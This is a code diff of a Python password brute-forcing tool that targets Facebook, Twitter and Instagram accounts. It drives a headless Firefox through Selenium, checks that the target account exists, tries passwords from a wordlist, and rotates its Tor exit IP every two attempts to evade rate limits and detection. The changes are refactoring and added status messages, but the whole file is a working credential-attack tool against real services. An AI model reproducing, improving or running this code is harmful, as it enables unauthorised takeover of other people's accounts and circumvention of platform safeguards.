@@ -53,7 +53,7 @@ def main():
         delay = 1
 
 
-    os.system("clear && /etc/init.d/tor restart && rm -rf tmp/ geckodriver.log")
+    os.system("clear && /etc/init.d/tor restart && rm -rf tmp/ geckodriver.log") # restarting tor & removing geckodriver log
 
     Bruter(service, username, wordlist, delay).execute()
 
@@ -87,78 +87,83 @@ class Bruter(object):
 
         if not controller:
 
+            print("[ " + R + "Error" + W + " ]" + " Stem controller not running" + W)
+
             self.stopTOR()
 
             exit(1)
+       
+
+        print("[ " + G + "ok" + W + " ]" + " Stem controller running\n")
 
         print("- Bruteforce starting ( Delay = %s sec ) -\n" % self.delay)
 
 
-    def setIP(self):    # Changing Public IP 
+    def setIP(self):        # Changing Public IP by sending signal newnym
 
         with Controller.from_port(port = 9051) as controller:
 
-            controller.authenticate(password = 'tor_password')
+            controller.authenticate()
 
             controller.signal(Signal.NEWNYM)
 
 
-    def execute(self):  # Connection Between def main() 
+    def execute(self):   # Connection Between def main() 
   
         if self.usercheck(self.username, self.service) == 1:
 
-            print("[ " + R + "Error" + W + " ]" + " Username Does not Exist\n" + W)
+            print("[ " + R + "Error" + W + " ]" + " Username Does not Exist" + W)
             
             exit(1)
 
-        else:
+        print("[ " + G + "ok" + W + " ]" + " Checking Account Existence")
 
-            print("[ " + G + "ok" + W + " ]" + " Checking Account Existence\n")
-
-            self.webBruteforce(self.username, self.wordlist, self.service, self.delay)
+        self.webBruteforce(self.username, self.wordlist, self.service, self.delay)
 
 
-    def usercheck(self, username, service):
+    def usercheck(self, username, service):   # Checking Username
 
-        display = Display(visible=0, size=(800, 600))
+       display = Display(visible=0, size=(800, 600)) # Pyvirtual display starting
 
-        display.start()
+       display.start()
 
-        global driver
+       global driver
 
-        driver = webdriver.Firefox()
+       driver = webdriver.Firefox()
 
-        try:
+       try:
 
-            if service == "facebook":
+           if service == "facebook":
 
-                 fb_name = raw_input(O + "Please Enter The NAME Of The Facebook Account : " + W)
+               fb_name = raw_input(O + "Please Enter The NAME Of The Facebook Account : " + W)
 
-                 driver.get("https://www.facebook.com/public/" + fb_name)
+               driver.get("https://www.facebook.com/public/" + fb_name)
 
-                 assert (("We couldn't find anything for") not in driver.page_source)
+               assert (("We couldn't find anything for") not in driver.page_source)
 
-                 driver.close()
+               driver.close()
 
-            elif service == "twitter":
+               os.system("clear && /etc/init.d/tor restart")
 
-                driver.get("https://www.twitter.com/" + username)
+           elif service == "twitter":
 
-                assert (("Sorry, that page doesn’t exist!") not in driver.page_source)
+               driver.get("https://www.twitter.com/" + username)
 
-                driver.close()
+               assert (("Sorry, that page doesn’t exist!") not in driver.page_source)
 
-            elif service == "instagram":
+               driver.close()
 
-                driver.get("https://instagram.com/" + username)
+           elif service == "instagram":
 
-                assert (("Sorry, this page isn't available.") not in driver.page_source)
+               driver.get("https://instagram.com/" + username)
 
-                driver.close()
+               assert (("Sorry, this page isn't available.") not in driver.page_source)
 
-        except AssertionError:
+               driver.close()
 
-            return 1
+       except AssertionError:
+
+           return 1
 
     def webBruteforce(self, username, wordlist, service, delay):
 
@@ -180,7 +185,25 @@ class Bruter(object):
 
         self.Tor_Check()
 
-        j=0
+
+        if service == "facebook":
+
+            elem = driver.find_element_by_name("email")
+
+        elif service == "twitter":
+
+            elem = driver.find_element_by_name("session[username_or_email]")
+
+        elif service == "instagram":
+
+            elem = driver.find_element_by_name("username")
+
+        elem.clear()
+        elem.send_keys(username)
+
+        my_ip = urlopen("http://ip.42.pl/raw").read()
+
+        j=0 
 
         wordlist = open(wordlist, 'r')
 
@@ -188,23 +211,7 @@ class Bruter(object):
 
             password = i.strip("\n")
 
-            try:
-
-                if service == "facebook":
-
-                    elem = driver.find_element_by_name("email")
-
-                elif service == "twitter":
-
-                    elem = driver.find_element_by_name("session[username_or_email]")
-
-                elif service == "instagram":
-
-                    elem = driver.find_element_by_name("username")
-
-                elem.clear()
-                elem.send_keys(username)                
-
+            try:               
 
                 if service == "facebook":
 
@@ -241,17 +248,17 @@ class Bruter(object):
 
                     assert (("Log in — Instagram") in driver.title)
 
+                if j == 2:
+
+                   j=0
+
+                   self.setIP()
+
+                   my_ip = urlopen("http://ip.42.pl/raw").read()
+
                 print(O + ("  Password: %s \t| Failed \t| IP : %s \n " % (password,my_ip)) + W)
 
                 j+=1
-
-                if j == 2:
-
-                   self.setIP()
-                   
-                   my_ip = urlopen("http://ip.42.pl/raw").read()
-
-                   j = 0
 
                 sleep(delay)
 
